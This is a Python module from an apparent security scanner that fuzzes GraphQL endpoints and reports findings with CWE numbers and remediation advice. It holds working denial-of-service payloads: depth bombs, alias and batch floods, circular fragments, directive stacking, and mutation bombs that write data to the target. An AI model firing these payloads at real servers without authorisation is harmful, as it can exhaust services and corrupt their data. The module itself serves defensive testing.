"""
GraphQL-specific fuzzing — depth bombs, alias abuse, batched mutations,
directive injection, field duplication, and introspection abuse.

CWE-770: Allocation of Resources Without Limits or Throttling
CWE-400: Uncontrolled Resource Consumption
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger(__name__)


# ------------------------------------------------------------------
# Payload helpers
# ------------------------------------------------------------------

def _depth_bomb(depth: int) -> str:
    """Recursive nested query to exhaust server resources."""
    inner = '{ id name }'
    for _ in range(depth):
        inner = f'{{ items {inner} }}'
    return f'query {{ node {inner} }}'


def _alias_query(count: int) -> str:
    """Many aliased copies of the same field."""
    aliases = " ".join(f'a{i}: __typename' for i in range(count))
    return f'{{ {aliases} }}'


def _batch_queries(count: int) -> List[Dict[str, str]]:
    """Array-based batched queries."""
    return [{"query": "{ __typename }"} for _ in range(count)]


def _field_duplication(count: int) -> str:
    """Duplicate the same field many times without aliases."""
    fields = " ".join("__typename" for _ in range(count))
    return f'{{ {fields} }}'


def _directive_overload(count: int) -> str:
    """Stack many directives on a single field."""
    dirs = " ".join(f"@skip(if: false)" for _ in range(count))
    return f'{{ __typename {dirs} }}'


def _circular_fragment() -> str:
    """Circular fragment spread (parser/runtime DoS)."""
    return (
        "{ ...A }\n"
        "fragment A on Query { ...B }\n"
        "fragment B on Query { ...A }"
    )


def _introspection_full() -> str:
    """Full introspection query — check if exposed."""
    return """
    {
      __schema {
        types { name kind fields { name type { name kind ofType { name } } } }
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        directives { name locations args { name type { name } } }
      }
    }
    """


def _mutation_bomb(count: int) -> str:
    """Many mutations in a single request."""
    mutations = " ".join(
        f'm{i}: createItem(input: {{name: "fuzz{i}"}}) {{ id }}'
        for i in range(count)
    )
    return f'mutation {{ {mutations} }}'


# ------------------------------------------------------------------
# Dataclass for test configuration
# ------------------------------------------------------------------

@dataclass
class GraphqlFuzzProfile:
    """Configurable parameters for GraphQL fuzzing intensity."""
    depth_levels: List[int] = field(default_factory=lambda: [10, 25, 50, 100])
    alias_counts: List[int] = field(default_factory=lambda: [50, 200, 500, 1000])
    batch_sizes: List[int] = field(default_factory=lambda: [10, 50, 100, 500])
    field_dup_counts: List[int] = field(default_factory=lambda: [100, 500, 1000])
    directive_counts: List[int] = field(default_factory=lambda: [10, 50, 100])
    mutation_counts: List[int] = field(default_factory=lambda: [10, 50, 100])


# ------------------------------------------------------------------
# Main class
# ------------------------------------------------------------------

class GraphqlFuzzer:
    """
    Fuzzes GraphQL endpoints with resource-exhaustion and
    structure-abuse payloads.
    """

    def __init__(
        self,
        http_client: Optional[HttpClient] = None,
        profile: Optional[GraphqlFuzzProfile] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is not None
        self._profile = profile or GraphqlFuzzProfile()

    # ----------------------------------------------------------
    # Public API
    # ----------------------------------------------------------

    async def check(self, target: Target) -> List[Finding]:
        """Run all GraphQL fuzzing checks against *target*."""
        client = self._client
        if client is None:
            return []

        findings: List[Finding] = []
        url = target.url

        findings.extend(await self._test_depth_bombs(client, url, target))
        findings.extend(await self._test_alias_abuse(client, url, target))
        findings.extend(await self._test_batch_queries(client, url, target))
        findings.extend(await self._test_field_duplication(client, url, target))
        findings.extend(await self._test_directive_overload(client, url, target))
        findings.extend(await self._test_circular_fragments(client, url, target))
        findings.extend(await self._test_introspection(client, url, target))
        findings.extend(await self._test_mutation_bombs(client, url, target))

        return findings

    # ----------------------------------------------------------
    # Individual tests
    # ----------------------------------------------------------

    async def _test_depth_bombs(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []
        prev_time: Optional[float] = None

        for depth in self._profile.depth_levels:
            query = _depth_bomb(depth)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body={"query": query},
                    headers={"Content-Type": "application/json"},
                )
                elapsed = resp.elapsed.total_seconds() if hasattr(resp, 'elapsed') else 0

                if resp.status_code == 200 and elapsed > 5.0:
                    findings.append(Finding(
                        title=f"GraphQL depth bomb accepted (depth={depth})",
                        description=(
                            f"Server accepted a deeply-nested query ({depth} levels) "
                            f"and took {elapsed:.1f}s to respond, indicating no query "
                            f"depth limit is enforced."
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=f"Depth: {depth}\nResponse time: {elapsed:.1f}s\nStatus: {resp.status_code}",
                        remediation="Enforce a maximum query depth limit (typically 7-10 levels).",
                        cwe=770,
                        tags=["graphql", "depth-bomb", "dos", "grotassault"],
                    ))
                    break  # One finding sufficient

                if resp.status_code == 200 and prev_time and elapsed > prev_time * 3:
                    findings.append(Finding(
                        title=f"GraphQL depth scaling detected (depth={depth})",
                        description=(
                            f"Response time scaled disproportionately at depth={depth} "
                            f"({elapsed:.1f}s vs {prev_time:.1f}s at previous level)."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=f"Depth: {depth}\nTime: {elapsed:.1f}s\nPrev: {prev_time:.1f}s",
                        remediation="Enforce a maximum query depth limit.",
                        cwe=770,
                        tags=["graphql", "depth-bomb", "dos", "grotassault"],
                    ))
                    break

                prev_time = elapsed

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings

    async def _test_alias_abuse(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []

        for count in self._profile.alias_counts:
            query = _alias_query(count)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body={"query": query},
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code == 200:
                    body = resp.text
                    # Count alias keys in response
                    alias_found = sum(1 for i in range(count) if f'"a{i}"' in body)
                    if alias_found > count * 0.8:
                        findings.append(Finding(
                            title=f"GraphQL alias abuse accepted ({count} aliases)",
                            description=(
                                f"Server resolved {alias_found}/{count} aliased fields "
                                f"in a single query. No alias count limit is enforced."
                            ),
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=f"Aliases sent: {count}\nResolved: {alias_found}\nStatus: {resp.status_code}",
                            remediation="Enforce a maximum alias count or query complexity score.",
                            cwe=770,
                            tags=["graphql", "alias-abuse", "dos", "grotassault"],
                        ))
                        break

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings

    async def _test_batch_queries(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []

        for size in self._profile.batch_sizes:
            batch = _batch_queries(size)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body=batch,
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, list) and len(data) >= size * 0.8:
                            findings.append(Finding(
                                title=f"GraphQL batch query accepted ({size} queries)",
                                description=(
                                    f"Server accepted {size} batched queries in a single "
                                    f"HTTP request and returned {len(data)} results."
                                ),
                                severity=Severity.MEDIUM,
                                target=target,
                                evidence=f"Batch size: {size}\nResults: {len(data)}",
                                remediation="Limit batch query count (max 5-10 per request).",
                                cwe=770,
                                tags=["graphql", "batch-abuse", "dos", "grotassault"],
                            ))
                            break
                    except (ValueError, KeyError):
                        pass

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings

    async def _test_field_duplication(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []

        for count in self._profile.field_dup_counts:
            query = _field_duplication(count)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body={"query": query},
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code == 200 and len(resp.content) > 1024:
                    findings.append(Finding(
                        title=f"GraphQL field duplication accepted ({count} copies)",
                        description=(
                            f"Server accepted {count} duplicated field selections. "
                            f"Response size: {len(resp.content)} bytes."
                        ),
                        severity=Severity.LOW,
                        target=target,
                        evidence=f"Fields: {count}\nResponse size: {len(resp.content)} bytes",
                        remediation="Deduplicate field selections or limit query complexity.",
                        cwe=400,
                        tags=["graphql", "field-duplication", "grotassault"],
                    ))
                    break

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings

    async def _test_directive_overload(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []

        for count in self._profile.directive_counts:
            query = _directive_overload(count)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body={"query": query},
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code == 200:
                    findings.append(Finding(
                        title=f"GraphQL directive overload accepted ({count} directives)",
                        description=(
                            f"Server accepted a query with {count} stacked directives "
                            f"on a single field without rejection."
                        ),
                        severity=Severity.LOW,
                        target=target,
                        evidence=f"Directive count: {count}\nStatus: {resp.status_code}",
                        remediation="Limit the number of directives per field/operation.",
                        cwe=400,
                        tags=["graphql", "directive-overload", "grotassault"],
                    ))
                    break

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings

    async def _test_circular_fragments(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        query = _circular_fragment()
        try:
            resp = await client.request(
                "POST", url,
                json_body={"query": query},
                headers={"Content-Type": "application/json"},
            )

            if resp.status_code == 200:
                # If the server doesn't reject circular fragments, it's a DoS vector
                text = resp.text.lower()
                if "error" not in text:
                    return [Finding(
                        title="GraphQL circular fragment not rejected",
                        description=(
                            "Server accepted a query containing circular fragment spreads "
                            "(A→B→A) without returning an error. This can cause infinite "
                            "loops or excessive memory consumption."
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=f"Query: {query[:200]}\nStatus: {resp.status_code}",
                        remediation="Reject queries with circular fragment references at validation time.",
                        cwe=770,
                        tags=["graphql", "circular-fragment", "dos", "grotassault"],
                    )]

        except (httpx.HTTPError, OSError, ValueError):
            pass

        return []

    async def _test_introspection(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        query = _introspection_full()
        try:
            resp = await client.request(
                "POST", url,
                json_body={"query": query},
                headers={"Content-Type": "application/json"},
            )

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    schema = data.get("data", {}).get("__schema", {})
                    if schema and schema.get("types"):
                        type_count = len(schema["types"])
                        mutation_type = schema.get("mutationType")
                        return [Finding(
                            title="GraphQL introspection enabled in production",
                            description=(
                                f"Full introspection query returned {type_count} types. "
                                f"Mutation type: {'exposed' if mutation_type else 'none'}. "
                                f"Introspection should be disabled in production."
                            ),
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=(
                                f"Types exposed: {type_count}\n"
                                f"Mutation type: {mutation_type}\n"
                                f"Schema size: {len(resp.content)} bytes"
                            ),
                            remediation="Disable introspection in production (set introspection: false).",
                            cwe=200,
                            tags=["graphql", "introspection", "info-disclosure", "grotassault"],
                        )]
                except (ValueError, KeyError):
                    pass

        except (httpx.HTTPError, OSError, ValueError):
            pass

        return []

    async def _test_mutation_bombs(
        self, client: HttpClient, url: str, target: Target,
    ) -> List[Finding]:
        findings: List[Finding] = []

        for count in self._profile.mutation_counts:
            query = _mutation_bomb(count)
            try:
                resp = await client.request(
                    "POST", url,
                    json_body={"query": query},
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        result_data = data.get("data", {})
                        if result_data and len(result_data) >= count * 0.5:
                            findings.append(Finding(
                                title=f"GraphQL mutation bomb accepted ({count} mutations)",
                                description=(
                                    f"Server executed {len(result_data)} out of {count} "
                                    f"mutations in a single request without limit."
                                ),
                                severity=Severity.HIGH,
                                target=target,
                                evidence=f"Mutations sent: {count}\nExecuted: {len(result_data)}",
                                remediation="Limit mutations per operation to prevent bulk abuse.",
                                cwe=770,
                                tags=["graphql", "mutation-bomb", "dos", "grotassault"],
                            ))
                            break
                    except (ValueError, KeyError):
                        pass

            except (httpx.HTTPError, OSError, ValueError):
                pass

        return findings
